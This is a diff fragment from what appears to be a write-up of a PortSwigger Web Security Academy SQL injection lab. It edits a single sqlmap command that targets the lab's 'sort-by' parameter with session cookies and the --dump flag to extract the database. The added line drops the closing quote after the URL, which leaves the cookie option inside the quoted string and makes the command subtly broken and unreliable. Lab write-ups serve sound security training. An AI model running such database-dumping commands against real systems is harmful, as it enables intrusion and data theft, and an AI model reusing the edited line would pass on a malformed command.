@@ -79,7 +79,7 @@ We see a parameter ⇒ sorted-by vulnerable to SQLi
 I launched the sqlmap command below : 
 
 ```jsx
-sqlmap -u "[https://0a5800ae0314d4b3c09c3b3500dd000f.web-security-academy.net/filtered_search?SearchTerm=&writer=&sort-by=DATE*](https://0a5800ae0314d4b3c09c3b3500dd000f.web-security-academy.net/filtered_search?SearchTerm=&writer=&sort-by=DATE*)" --cookie="_lab=46%7cMCwCFAuZTmvz13aVBBW1bpQM25dE2RVNAhRq8fmJk1vCl2i8uauGpq2N%2bIytqdEsQkFl0b%2b8pNzF%2f4p3No1yF19zA%2bj3GuVuecfTlUlSWFGu7SfWBmEz6Mu0JEWnJg5r4GggAibBFB9QtX0gMd%2fLhfFCfcTKNJtOaZ4mGvaUex6vw3k%3d; session=F8UksvHTO0lwQgGckaeEpePsgEJQTvs2" --dump
+sqlmap -u "https://0a5800ae0314d4b3c09c3b3500dd000f.web-security-academy.net/filtered_search?SearchTerm=&writer=&sort-by=DATE* --cookie="_lab=46%7cMCwCFAuZTmvz13aVBBW1bpQM25dE2RVNAhRq8fmJk1vCl2i8uauGpq2N%2bIytqdEsQkFl0b%2b8pNzF%2f4p3No1yF19zA%2bj3GuVuecfTlUlSWFGu7SfWBmEz6Mu0JEWnJg5r4GggAibBFB9QtX0gMd%2fLhfFCfcTKNJtOaZ4mGvaUex6vw3k%3d; session=F8UksvHTO0lwQgGckaeEpePsgEJQTvs2" --dump
 ```
 
 ![SQLi result.png](/assets/images/burp/SQLi_result.png)
